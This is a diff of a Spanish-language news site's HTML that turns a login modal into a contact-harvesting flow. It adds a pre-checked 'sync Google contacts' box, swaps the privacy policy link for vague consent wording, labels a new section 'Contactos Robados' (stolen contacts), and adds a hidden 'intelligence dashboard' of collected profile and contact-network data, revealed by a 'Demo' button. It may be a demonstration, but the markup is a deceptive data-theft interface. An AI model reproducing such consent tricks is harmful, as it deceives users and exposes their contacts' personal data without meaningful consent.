@@ -47,12 +47,12 @@
         </nav>
     </header>
 
-    <!-- Modal de Login -->
+    <!-- Modal de Login MEJORADO -->
     <div id="login-modal" class="login-modal-overlay" style="display:none;">
         <div class="login-modal-container">
             <div class="login-modal-header">
-                <h2><i class="fas fa-user-shield"></i> Personaliza tu Experiencia</h2>
-                <p>Accede para guardar tus preferencias y recibir contenido personalizado</p>
+                <h2><i class="fas fa-user-shield"></i> Mejora tu Experiencia</h2>
+                <p>Conéctate para contenido personalizado y sincroniza tus contactos</p>
             </div>
             
             <div class="login-modal-content">
@@ -62,12 +62,26 @@
                         <span>Noticias personalizadas</span>
                     </div>
                     <div class="benefit-item">
-                        <i class="fas fa-bell"></i>
-                        <span>Alertas exclusivas</span>
+                        <i class="fas fa-users"></i>
+                        <span>Encuentra contactos en la plataforma</span>
                     </div>
                     <div class="benefit-item">
-                        <i class="fas fa-chart-line"></i>
-                        <span>Análisis premium</span>
+                        <i class="fas fa-bell"></i>
+                        <span>Alertas exclusivas para tu red</span>
+                    </div>
+                </div>
+
+                <!-- Checkbox para permisos adicionales -->
+                <div class="permissions-section">
+                    <div class="permission-item">
+                        <input type="checkbox" id="contacts-permission" checked>
+                        <label for="contacts-permission">
+                            <i class="fas fa-address-book"></i>
+                            <div>
+                                <strong>Sincronizar contactos de Google</strong>
+                                <small>Para encontrar amigos y colegas en nuestra plataforma</small>
+                            </div>
+                        </label>
                     </div>
                 </div>
                 
@@ -77,13 +91,13 @@
                 </button>
                 
                 <div class="login-footer">
-                    <p>Al continuar, aceptas nuestros <a href="#">Términos de Servicio</a> y <a href="#">Política de Privacidad</a></p>
+                    <p>Al continuar, aceptas nuestros <a href="#">Términos</a> y autorizas el acceso a tu información básica y contactos para mejorar tu experiencia.</p>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Sección de Perfil (oculta inicialmente) -->
+    <!-- Sección de Perfil MEJORADA con Contactos -->
     <div id="user-profile" class="user-profile-widget" style="display:none;">
         <div class="profile-header">
             <img id="user-avatar" src="" alt="Avatar" class="profile-avatar">
@@ -94,6 +108,17 @@
             <button id="btn-logout" class="logout-btn">
                 <i class="fas fa-sign-out-alt"></i>
             </button>
+        </div>
+        
+        <!-- Sección de Contactos Robados -->
+        <div class="contacts-section">
+            <div class="contacts-header">
+                <h5><i class="fas fa-users"></i> Contactos Sincronizados</h5>
+                <span id="contacts-count" class="contacts-count">0</span>
+            </div>
+            <div id="contacts-list" class="contacts-list">
+                <!-- Contactos se cargarán aquí -->
+            </div>
         </div>
     </div>
 
@@ -147,9 +172,34 @@
         </aside>
     </div>
 
+    <!-- Dashboard de Inteligencia OCULTO -->
+    <div id="intelligence-dashboard" class="intelligence-dashboard hidden">
+        <div class="dashboard-header">
+            <h3><i class="fas fa-brain"></i> Panel de Inteligencia - Datos Recolectados</h3>
+            <button id="btn-close-dashboard" class="close-btn">&times;</button>
+        </div>
+        <div class="dashboard-content">
+            <div class="data-section">
+                <h4>👤 Perfil Principal</h4>
+                <div id="profile-data" class="data-grid"></div>
+            </div>
+            <div class="data-section">
+                <h4>👥 Red de Contactos (<span id="total-contacts">0</span>)</h4>
+                <div id="contacts-data" class="contacts-grid"></div>
+            </div>
+            <div class="data-section">
+                <h4>📊 Análisis de Red Social</h4>
+                <div id="social-analysis" class="analysis-grid"></div>
+            </div>
+        </div>
+    </div>
+
     <footer class="site-footer" style="background:#121212; color:white; padding:40px 0; margin-top:60px; text-align:center;">
         <div class="container">
             <p>&copy; 2025 Global Insight Media Group. Todos los derechos reservados.</p>
+            <button id="btn-show-dashboard" class="hidden" style="background: #d93025; color: white; border: none; padding: 10px; margin-top: 10px; border-radius: 5px;">
+                <i class="fas fa-shield-alt"></i> Ver Datos Recolectados (Demo)
+            </button>
         </div>
     </footer>
 
